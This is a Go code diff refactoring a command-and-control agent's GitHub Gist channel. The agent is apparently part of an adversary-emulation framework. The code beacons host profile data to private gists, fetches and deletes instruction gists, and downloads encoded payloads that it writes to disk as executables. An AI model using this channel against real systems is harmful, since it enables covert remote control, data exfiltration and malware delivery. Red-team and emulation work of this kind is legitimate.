@@ -71,7 +71,7 @@ func (contact GIST) DropPayloads(payload string, server string, uniqueId string)
 	ctx := context.Background()
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	if len(payloads) > 0 {
-		return gistPayloadDrop(ctx, payloads, uniqueId)
+		return gistPayloadDrop(ctx, uniqueId)
 	}
 	return []string{}
 }
@@ -84,35 +84,22 @@ func (contact GIST) RunInstruction(command map[string]interface{}, profile map[s
 }
 
 func gistBeacon(ctx context.Context, profile map[string]interface{}) ([]byte, bool) {
+	createHeartbeatGist(ctx, "beacon", profile)
 	//collect instructions & delete
-	gists, _, err := c2Client.Gists.List(ctx, username, nil)
-	heartbeat := false
-	if err == nil {
-		heartbeat = true
-		var tasks string
-		for _, gist := range gists {
-			if !*gist.Public && (*gist.Description == fmt.Sprintf("instructions-%s", profile["paw"])) {
-				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
-				if err == nil {
-					for _, file := range fullGist.Files {
-						tasks = *file.Content
-					}
-				}
-				c2Client.Gists.Delete(ctx, fullGist.GetID())
-			}
-		}
-		//create heartbeat gist
-		data, _ := json.Marshal(profile)
-		if createGist(ctx, "beacon", profile["paw"].(string), data).StatusCode != created {
-			output.VerbosePrint("[-] Heartbeat GIST: FAILED")
-		} else {
-			output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
-		}
-		if tasks != "" {
-			return util.Decode(tasks), heartbeat
-		}
+	contents := getGists(ctx, "instructions", profile["paw"].(string))
+	if contents != nil {
+			return util.Decode(contents[0]), true
 	}
-	return nil, heartbeat
+	return nil, false
+}
+
+func createHeartbeatGist(ctx context.Context, gistType string, profile map[string]interface{}) {
+	data, _ := json.Marshal(profile)
+	if createGist(ctx, "beacon", profile["paw"].(string), data).StatusCode != created {
+		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
+	} else {
+		output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
+	}
 }
 
 func gistResults(ctx context.Context, uniqueId string, commandID interface{}, result []byte, status string, cmd string, pid string) {
@@ -129,31 +116,14 @@ func gistResults(ctx context.Context, uniqueId string, commandID interface{}, re
 	}
 }
 
-func gistPayloadDrop(ctx context.Context, payloads []string, uniqueId string) []string {
+func gistPayloadDrop(ctx context.Context, uniqueId string) []string {
 	var droppedPayloads []string
+	payloads := getGists(ctx, "payloads", uniqueId)
 	for _, payload := range payloads {
+		output.VerbosePrint(fmt.Sprintf("[*] Downloaded new payload: %s", payload))
 		location := filepath.Join(payload)
-		if len(payload) > 0 && util.Exists(location) == false {
-			output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
-			gists, _, err := c2Client.Gists.List(ctx, username, nil)
-			if err == nil {
-				var payload string
-				for _, gist := range gists {
-					if !*gist.Public && (*gist.Description == fmt.Sprintf("payloads-%s", uniqueId)) {
-						fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
-						if err == nil {
-							for _, file := range fullGist.Files {
-								payload = *file.Content
-								dst, _ := os.Create(location)
-								defer dst.Close()
-								_, _ = dst.Write(util.Decode(payload))
-								os.Chmod(location, 0500)
-							}
-						}
-						c2Client.Gists.Delete(ctx, fullGist.GetID())
-					}
-				}
-			}
+		if util.Exists(location) == false {
+			util.WritePayloadBytes(location, util.Decode(payload))
 		}
 		droppedPayloads = append(droppedPayloads, payload)
 	}
@@ -161,7 +131,7 @@ func gistPayloadDrop(ctx context.Context, payloads []string, uniqueId string) []
 }
 
 func createGist(ctx context.Context, gistType string, uniqueId string, data []byte) *github.Response {
-	gistDescriptor := fmt.Sprintf("%s-%s", gistType, uniqueId)
+	gistDescriptor := getGistDescriptor(gistType, uniqueId)
 	stringified := string(util.Encode(data))
 	file := github.GistFile{Content: &stringified,}
 	files := make(map[github.GistFilename]github.GistFile)
@@ -172,6 +142,25 @@ func createGist(ctx context.Context, gistType string, uniqueId string, data []by
 	return resp
 }
 
-func getGist() {
+func getGists(ctx context.Context, gistType string, uniqueID string) []string {
+	var contents []string
+	gists, _, err := c2Client.Gists.List(ctx, username, nil)
+	if err == nil {
+		for _, gist := range gists {
+			if !*gist.Public && (*gist.Description == getGistDescriptor(gistType, uniqueID)) {
+				fullGist, _, err := c2Client.Gists.Get(ctx, gist.GetID())
+				if err == nil {
+					for _, file := range fullGist.Files {
+						contents = append(contents, *file.Content)
+					}
+				}
+				c2Client.Gists.Delete(ctx, fullGist.GetID())
+			}
+		}
+	}
+	return contents
+}
 
+func getGistDescriptor(gistType string, uniqueId string) string {
+	return fmt.Sprintf("%s-%s", gistType, uniqueId)
 }
